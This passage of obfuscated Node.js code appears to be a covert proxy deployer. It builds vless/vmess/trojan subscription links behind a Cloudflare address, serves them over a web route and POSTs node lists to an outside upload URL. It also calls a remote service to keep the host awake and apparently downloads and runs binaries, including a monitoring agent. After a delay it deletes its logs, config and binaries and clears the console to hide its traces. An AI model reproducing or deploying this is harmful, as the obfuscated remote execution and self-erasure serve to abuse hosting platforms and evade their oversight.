_0x5839f0={_0x3b5e5b:0x158,_0x1f0bfb:0x193,_0x3b67ef:0x1ae,_0x4141dc:0x179,_0x30ad38:0x1d5,_0x1712c2:0x121,_0x28d6aa:0x1bd,_0x3c470d:0x112,_0x2bbcdc:0x12e,_0x223430:0x195,_0x1f9d50:0x184,_0x50dc73:0x1c4,_0x2091e5:0x112,_0x4a7e40:0x1b1},_0x3ad7fc=await _0x424f76(),_0x279bb8=NAME?NAME+'-'+_0x3ad7fc:_0x3ad7fc;return new Promise(_0x1f819f=>{setTimeout(()=>{const _0x547d5e={_0x438ee7:0x184,_0x362e95:0x18b,_0x423b03:0x122},_0x4efeb7=_0x2274,_0x38e753={'v':'2','ps':''+_0x279bb8,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x4efeb7(_0x5839f0._0x3b5e5b),'host':_0x5e4601,'path':_0x4efeb7(0x183),'tls':_0x4efeb7(0x16c),'sni':_0x5e4601,'alpn':'','fp':_0x4efeb7(0x13c)},_0x286440=_0x4efeb7(_0x5839f0._0x1f0bfb)+UUID+'@'+CFIP+':'+CFPORT+_0x4efeb7(_0x5839f0._0x3b67ef)+_0x5e4601+_0x4efeb7(_0x5839f0._0x4141dc)+_0x5e4601+_0x4efeb7(_0x5839f0._0x30ad38)+_0x279bb8+_0x4efeb7(_0x5839f0._0x1712c2)+Buffer[_0x4efeb7(0x184)](JSON[_0x4efeb7(_0x5839f0._0x28d6aa)](_0x38e753))['toString'](_0x4efeb7(_0x5839f0._0x3c470d))+_0x4efeb7(_0x5839f0._0x2bbcdc)+UUID+'@'+CFIP+':'+CFPORT+_0x4efeb7(_0x5839f0._0x223430)+_0x5e4601+_0x4efeb7(0x179)+_0x5e4601+_0x4efeb7(0x11a)+_0x279bb8+_0x4efeb7(0x185);console['log'](Buffer[_0x4efeb7(0x184)](_0x286440)[_0x4efeb7(0x1c4)]('base64')),fs['writeFileSync'](subPath,Buffer[_0x4efeb7(_0x5839f0._0x1f9d50)](_0x286440)[_0x4efeb7(_0x5839f0._0x50dc73)](_0x4efeb7(_0x5839f0._0x2091e5))),console['log'](FILE_PATH+_0x4efeb7(_0x5839f0._0x4a7e40)),uploadNodes(),app[_0x4efeb7(0x159)]('/'+SUB_PATH,(_0x41ddd6,_0x153ee9)=>{const _0x519953=_0x4efeb7,_0x41ec84=Buffer[_0x519953(_0x547d5e._0x438ee7)](_0x286440)[_0x519953(0x1c4)]('base64');_0x153ee9[_0x519953(_0x547d5e._0x362e95)]('Content-Type',_0x519953(0x131)),_0x153ee9[_0x519953(_0x547d5e._0x423b03)](_0x41ec84);}),_0x1f819f(_0x286440);},0x7d0);});}}async function uploadNodes(){const _0x1c520c={_0x37a989:0x110,_0x4769ca:0x118,_0x292544:0x126,_0x530f1e:0x1a6,_0x4da63a:0x11f},_0x401418=_0x44253e;if(UPLOAD_URL&&PROJECT_URL){const _0x2e1906=PROJECT_URL+'/'+SUB_PATH,_0x1f800d={'subscription':[_0x2e1906]};try{const _0x5e8bae=await axios[_0x401418(_0x1c520c._0x37a989)](UPLOAD_URL+'/api/add-subscriptions',_0x1f800d,{'headers':{'Content-Type':'application/json'}});return _0x5e8bae&&_0x5e8bae[_0x401418(0x126)]===0xc8?(console[_0x401418(0x111)]('Subscription\x20uploaded\x20successfully'),_0x5e8bae):null;}catch(_0x59e03c){if(_0x59e03c[_0x401418(0x118)]){if(_0x59e03c[_0x401418(_0x1c520c._0x4769ca)][_0x401418(_0x1c520c._0x292544)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x23e549=fs['readFileSync'](listPath,_0x401418(_0x1c520c._0x530f1e)),_0x186a35=_0x23e549['split']('\x0a')[_0x401418(0x1cb)](_0x5ecd2c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x401418(0x11d)](_0x5ecd2c));if(_0x186a35[_0x401418(0x1ce)]===0x0)return;const _0x2b9e59=JSON['stringify']({'nodes':_0x186a35});try{const _0x17f341=await axios[_0x401418(0x110)](UPLOAD_URL+_0x401418(0x166),_0x2b9e59,{'headers':{'Content-Type':_0x401418(0x16a)}});return _0x17f341&&_0x17f341['status']===0xc8?(console[_0x401418(0x111)](_0x401418(_0x1c520c._0x4da63a)),_0x17f341):null;}catch(_0x4509e8){return null;}}else return;}}function cleanFiles(){const _0xa0e234={_0x38e500:0x1c2},_0x21a023={_0x36a514:0x111,_0xb4c2f6:0x164,_0x1cadc3:0x175};setTimeout(()=>{const _0x26ce16={_0x47a4bb:0x111},_0x14d041=_0x2274,_0x2003a7=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2003a7[_0x14d041(0x17b)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2003a7[_0x14d041(0x17b)](phpPath);process[_0x14d041(_0xa0e234._0x38e500)]==='win32'?exec(_0x14d041(0x18c)+_0x2003a7[_0x14d041(0x144)]('\x20')+_0x14d041(0x172),_0x35a02e=>{const _0x515631=_0x14d041;console['clear'](),console['log'](_0x515631(0x164)),console[_0x515631(_0x26ce16._0x47a4bb)](_0x515631(0x175));}):exec(_0x14d041(0x155)+_0x2003a7[_0x14d041(0x144)]('\x20')+_0x14d041(0x1a3),_0x291f5f=>{const _0x2dd324=_0x14d041;console[_0x2dd324(0x1ca)](),console[_0x2dd324(_0x21a023._0x36a514)](_0x2dd324(_0x21a023._0xb4c2f6)),console[_0x2dd324(_0x21a023._0x36a514)](_0x2dd324(_0x21a023._0x1cadc3));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2f4da0={_0x21bc48:0x111,_0x3578fc:0x110,_0x3050a7:0x16a,_0x5bb369:0x151},_0x5f0796=_0x44253e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5f0796(_0x2f4da0._0x21bc48)](_0x5f0796(0x1a8));return;}try{const _0xd7d138=await axios[_0x5f0796(_0x2f4da0._0x3578fc)](_0x5f0796(0x1bf),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5f0796(_0x2f4da0._0x3050a7)}});return console[_0x5f0796(0x111)](_0x5f0796(0x1cd)),_0xd7d138;}catch(_0x498bb6){return console[_0x5f0796(_0x2f4da0._0x5bb369)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x498bb6['message']),null;}}async function startserver(){const _0x448beb=_0x44253e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x500fd5){console[_0x448beb(0x151)]('Error\x20in\x20startserver:',_0x500fd5);}}startserver()[_0x44253e(0x11c)](_0x351003=>{const _0xb529c2=_0x44253e;console['error'](_0xb529c2(0x182),_0x351003);}),app['listen'](PORT,()=>console['log'](_0x44253e(0x173)+PORT+'!'));
